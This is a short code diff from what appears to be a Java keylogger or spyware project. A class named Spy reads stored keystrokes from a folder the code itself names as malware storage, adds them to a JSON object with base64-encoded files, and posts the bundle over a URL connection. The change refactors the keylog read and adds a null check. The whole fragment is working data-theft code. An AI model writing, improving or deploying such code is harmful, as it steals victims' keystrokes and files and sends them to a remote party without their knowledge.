@@ -51,9 +51,10 @@ public class Spy {
                 jsonObject.put(file.getName().split("\\.")[0].toLowerCase(), base64Encoding(file));
             }
 
-            String keypressFileContent = FileUtil.getStringFromFile(fileUtil.getMalwareKeypressStorageFolder().getAbsolutePath()
-                                    + File.separator + fileUtil.getKeypressFileName());
-            jsonObject.put("Keylog", keypressFileContent);
+            String keypressFileContent = fileUtil.getStringFromKeypressFile();
+
+            if(keypressFileContent != null)
+                jsonObject.put("Keylog", keypressFileContent);
 
             setPostRequestContent(urlConnection, jsonObject);
             urlConnection.connect();
